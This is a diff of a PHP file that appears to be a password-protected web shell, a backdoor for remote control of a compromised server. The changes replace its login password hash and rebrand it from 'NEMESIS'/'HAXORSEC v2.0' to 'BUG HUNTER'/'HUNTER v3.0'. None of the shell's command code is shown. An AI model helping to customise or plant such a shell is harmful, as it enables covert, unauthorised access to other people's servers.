@@ -8,7 +8,7 @@ session_start();
 
 
 
-$hashedPassword = "8c40a3914a337ef30edf600662b6aeef"; 
+$hashedPassword = "5f0cdbcc97175ed8ddf280cd59107ed3"; 
 
 
 
@@ -40,7 +40,7 @@ function login_shell($error = '') {
     <meta charset="UTF-8">
     <meta name="robots" content="noindex, nofollow">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEMESIS</title>
+    <title>BUG HUNTER</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
@@ -52,7 +52,7 @@ function login_shell($error = '') {
             <div class="mx-auto w-16 h-16 bg-blue-500/20 rounded-full flex items-center justify-center mb-4">
                 <i class="fas fa-user-shield text-blue-400 text-2xl"></i>
             </div>
-            <h1 class="text-2xl font-bold text-white">NEMESIS</h1>
+            <h1 class="text-2xl font-bold text-white">BUG HUNTER</h1>
             <p class="text-gray-400 text-sm mt-1">What passes me by will never be my destiny, and what is destined for me will never pass me by.</p>
         </div>
 
@@ -1836,7 +1836,7 @@ if ($_GET['don'] == true) {
 
                         <i class="fas fa-robot text-blue-400 text-2xl mr-2 cyber-glow"></i>
 
-                        <h1 class="text-xl font-bold cyber-font">HAXORSEC<span class="text-blue-400 cyber-glow">v2.0</span></h1>
+                        <h1 class="text-xl font-bold cyber-font">HUNTER<span class="text-blue-400 cyber-glow">v3.0</span></h1>
 
                     </div>
 
